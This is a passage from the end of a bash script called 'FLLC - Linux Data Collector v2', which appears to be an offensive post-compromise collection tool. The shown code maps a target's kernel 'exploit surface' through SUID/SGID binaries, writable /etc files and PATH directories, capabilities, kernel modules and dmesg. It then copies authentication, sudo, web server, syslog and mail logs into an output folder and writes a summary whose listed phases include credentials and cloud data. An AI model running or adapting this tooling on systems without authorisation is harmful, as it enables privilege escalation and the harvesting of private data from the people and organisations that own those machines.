    echo "perf_event_paranoid: $(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)"
    echo "ptrace_scope: $(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)"
    echo "SELinux: $(getenforce 2>/dev/null || echo 'not installed')"
    echo "AppArmor: $(aa-status 2>/dev/null | head -5 || echo 'not installed')"
    echo ""
    echo "=== Loaded Security Modules ==="
    cat /sys/kernel/security/lsm 2>/dev/null
} > "$OUT/exploit_surface/kernel_hardening.txt"

# SUID/SGID binaries (detailed with versions)
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | while read f; do
    version=$($f --version 2>/dev/null | head -1)
    echo "$f | $version"
done > "$OUT/exploit_surface/suid_sgid_detailed.txt"

# Writable /etc files
find /etc -writable -type f 2>/dev/null > "$OUT/exploit_surface/writable_etc.txt"

# World-writable directories in PATH
echo $PATH | tr ':' '\n' | while read p; do
    if [ -d "$p" ] && [ -w "$p" ]; then
        echo "WRITABLE PATH: $p"
    fi
done > "$OUT/exploit_surface/writable_path.txt"

# Capabilities
find / -type f -exec getcap {} \; 2>/dev/null > "$OUT/exploit_surface/capabilities.txt"

# Loaded kernel modules (potential vuln surface)
lsmod > "$OUT/exploit_surface/kernel_modules.txt" 2>/dev/null

# dmesg (may reveal exploitable info)
dmesg > "$OUT/exploit_surface/dmesg.txt" 2>/dev/null

log "  Kernel exploit surface mapped"

# ============================================================================
#  PHASE 12: LOG ANALYSIS & INTERESTING PATTERNS
# ============================================================================

log "PHASE 12: Log Analysis"

mkdir -p "$OUT/logs"

# Auth logs (login attempts, sudo usage)
cp /var/log/auth.log "$OUT/logs/auth.log" 2>/dev/null
cp /var/log/secure "$OUT/logs/secure.log" 2>/dev/null

# Failed logins
grep -i "failed\|failure\|invalid" /var/log/auth.log /var/log/secure 2>/dev/null | tail -200 > "$OUT/logs/failed_logins.txt"

# Sudo commands
grep "sudo" /var/log/auth.log /var/log/secure 2>/dev/null | tail -100 > "$OUT/logs/sudo_commands.txt"

# Web server logs (last 500 lines)
tail -500 /var/log/apache2/access.log > "$OUT/logs/apache_access.txt" 2>/dev/null
tail -500 /var/log/nginx/access.log > "$OUT/logs/nginx_access.txt" 2>/dev/null
tail -200 /var/log/apache2/error.log > "$OUT/logs/apache_error.txt" 2>/dev/null
tail -200 /var/log/nginx/error.log > "$OUT/logs/nginx_error.txt" 2>/dev/null

# Syslog
tail -300 /var/log/syslog > "$OUT/logs/syslog.txt" 2>/dev/null

# Mail logs
tail -100 /var/log/mail.log > "$OUT/logs/mail.txt" 2>/dev/null

log "  Log analysis complete"

# ============================================================================
#  FINALIZE
# ============================================================================

log "=== COLLECTION COMPLETE ==="

FILE_COUNT=$(find "$OUT" -type f | wc -l)
TOTAL_SIZE=$(du -sh "$OUT" 2>/dev/null | cut -f1)

cat > "$OUT/SUMMARY.txt" << EOF
============================================
FLLC - Linux Data Collector v2 (1.777)
============================================
Target:      $HOSTNAME
User:        $USERNAME
Root:        $IS_ROOT
Container:   $CONTAINER_TYPE
Timestamp:   $TIMESTAMP
Files:       $FILE_COUNT
Total Size:  $TOTAL_SIZE
Output:      $OUT
Phases:      12 (system/network/users/creds/cron/
              software/cloud/docs/databases/iac/
              tls/kernel/logs)
============================================
EOF

echo ""
echo "============================================"
echo " FLLC - Linux Collector v2 COMPLETE"
echo "============================================"
echo " Target:    $HOSTNAME"
echo " Container: $CONTAINER_TYPE"
echo " Files:     $FILE_COUNT"
echo " Size:      $TOTAL_SIZE"
echo " Output:    $OUT"
echo "============================================"
